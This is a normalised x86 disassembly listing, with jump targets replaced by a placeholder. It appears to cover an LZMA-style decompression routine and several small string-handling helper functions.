mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
lea eax [ edx + ecx + 0x1 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x38 ]
movzx eax [ edx + ecx * 2 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x54 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x28 ] 0x4
jae r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x48 ]
jb r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
cmp [ ebp - 0x20 ] 0x4
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x64 ] 0x3
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x64 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp - 0x64 ]
shl edx 0x6
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 2 + 0x360 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x1c ]
sub edx 0x40
mov [ ebp - 0x1c ] edx
cmp [ ebp - 0x1c ] 0x4
jb r-xdata
cmp [ ebp - 0x1c ] 0x40
jb r-xdata
mov eax [ ebp - 0x1c ]
shr eax 0x1
sub eax 0x1
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x1c ] 0xe
jae r-xdata
mov eax [ ebp - 0x2c ]
sub eax 0x4
mov [ ebp - 0x2c ] eax
mov edx [ ebp - 0x1c ]
and edx 0x1
or edx 0x2
mov ecx [ ebp - 0x2c ]
shl edx cl
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 2 + 0x560 ]
mov edx [ ebp - 0x1c ]
shl edx 0x1
sub ecx edx
sub ecx 0x2
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x4 ]
shr edx 0x1f
sub edx 0x1
and edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
sub eax edx
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x2c ]
sub ecx 0x1
mov [ ebp - 0x2c ] ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov [ ebp - 0x3c ] 0x1
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x644
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x2c ] 0x4
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x18 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x3c ] edx
mov edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x3c ]
add eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
shl edx 0x8
mov eax [ ebp + 0xc ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0x8 ] edx
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x10 ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x2c ]
sub eax 0x1
mov [ ebp - 0x2c ] eax
jne r-xdata
sub_40a0b0
push ebp
mov ebp esp
mov eax 0x1
shl eax 0x0
mov ecx [ ebp + 0xc ]
movzx edx [ ecx + eax ]
shl edx 0x18
mov eax 0x1
shl eax 0x1
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + eax ]
shl eax 0x10
or edx eax
mov ecx 0x1
imul ecx ecx 0x3
mov eax [ ebp + 0xc ]
movzx ecx [ eax + ecx ]
shl ecx 0x8
or edx ecx
mov eax 0x1
shl eax 0x2
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + eax ]
or edx eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4c ] 0x0
pop ebp
retn
sub_40a120
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4c ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x48 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x50 ] 0x1
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax + 0x50 ] 0x1
sub_40a1a0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x4 ]
mov eax 0x300
shl eax cl
add eax 0x736
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov edx 0x4
imul edx edx 0x3
mov eax [ ebp + 0x8 ]
mov [ eax + edx + 0x38 ] 0x1
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + ecx + 0x38 ] 0x1
mov eax 0x4
shl eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax + 0x38 ] 0x1
mov edx 0x4
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + edx + 0x38 ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x34 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x50 ] 0x0
mov esp ebp
pop ebp
retn
mov edx 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_40a260
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4093d0
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x0
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4c ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x1
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
cmp ecx [ ebp + 0xc ]
jb r-xdata
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x50 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40a1a0
add esp 0x4
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x5
jae r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x5
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x58 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x4 ] 0x14
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x4
xor eax eax
jmp r-xdata
mov eax 0x1
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + eax + 0x5c ]
test edx edx
je r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x58 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov dl [ edx ]
mov [ ecx + eax + 0x5c ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] ecx
mov eax [ ebp + 0x10 ]
add eax 0x1
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x58 ] edx
cmp [ ebp - 0xc ] 0x14
jb r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x4 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4095c0
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x1
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x2
mov eax 0x1
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax 0x5c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a0b0
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x0
mov eax 0x1
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x5c
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4095c0
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x8 ]
mov cl [ eax ]
mov [ edx + 0x5c ] cl
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x5c
push ecx
call sub_412c10
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x58 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
lea eax [ edx + ecx - 0x14 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x5c
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
push edx
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4094f0
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x14
jae r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
sub edx [ ebp + 0x10 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x14 ]
mov [ ebp + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x20 ] 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x5c
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
sub edx eax
mov eax [ ebp - 0xc ]
sub eax edx
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov edx [ ebp + 0x10 ]
add edx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] edx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x0
mov eax 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp - 0x1c ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4094f0
test eax eax
je r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x2
mov eax 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x2
mov eax 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x48 ] 0x112
je r-xdata
sub_40a630
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10 ] 0x0
pop ebp
retn
sub_40a660
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebp + 0x10 ] 0x5
jae r-xdata
mov eax 0x1
shl eax 0x0
mov ecx [ ebp + 0xc ]
movzx edx [ ecx + eax ]
mov eax 0x1
shl eax 0x1
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + eax ]
shl eax 0x8
or edx eax
mov ecx 0x1
imul ecx ecx 0x3
mov eax [ ebp + 0xc ]
movzx ecx [ eax + ecx ]
shl ecx 0x10
or edx ecx
mov eax 0x1
shl eax 0x2
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + eax ]
shl eax 0x18
or edx eax
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x1000
jae r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0xc ] edx
mov eax 0x1
imul eax eax 0x0
mov ecx [ ebp + 0xc ]
mov dl [ ecx + eax ]
mov [ ebp - 0x1 ] dl
movzx eax [ ebp - 0x1 ]
cmp eax 0xe1
jl r-xdata
mov [ ebp - 0x8 ] 0x1000
mov esp ebp
pop ebp
retn
movzx eax [ ebp - 0x1 ]
cdq
mov ecx 0x9
idiv ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
movzx eax [ ebp - 0x1 ]
cdq
mov ecx 0x9
idiv ecx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
cdq
mov ecx 0x5
idiv ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
movzx eax [ ebp - 0x1 ]
cdq
mov ecx 0x5
idiv ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
xor eax eax
mov eax 0x4
jmp r-xdata
sub_40a750
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
add ecx [ edx + 0x4 ]
mov eax 0x300
shl eax cl
add eax 0x736
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40a630
add esp 0x8
mov eax [ ebp - 0x4 ]
shl eax 0x1
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x54 ]
je r-xdata
xor eax eax
mov eax 0x2
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40a7d0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
call sub_40a660
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40a750
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
xor eax eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_40a850
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx ecx [ ebp + 0xc ]
cmp eax ecx
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x1
mov [ ebp + 0x10 ] ecx
pop ebp
retn
sub_40a890
push ebp
mov ebp esp
push ecx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
cmp ecx eax
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx ]
mov eax [ ebp + 0xc ]
movzx ecx [ eax ]
cmp edx ecx
jge r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x2
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
jmp r-xdata
sub_40a900
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
shl eax 0x1
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_412c10
add esp 0xc
pop ebp
retn
sub_40a920
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
shl eax 0x1
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40f760
add esp 0xc
pop ebp
retn
sub_40a960
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40a890
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40a9a0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
add eax 0x2
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov dx [ ecx ]
mov [ ebp - 0x2 ] dx
add [ ebp - 0x8 ] 0x2
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
sar eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_40aa00
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40a900
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40aa30
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x10 ]
movzx edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40a850
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40aa70
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40a920
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40aac0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
movsx ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov dl [ ecx ]
mov [ ebp - 0x1 ] dl
add [ ebp - 0x8 ] 0x1
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_40ab10
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
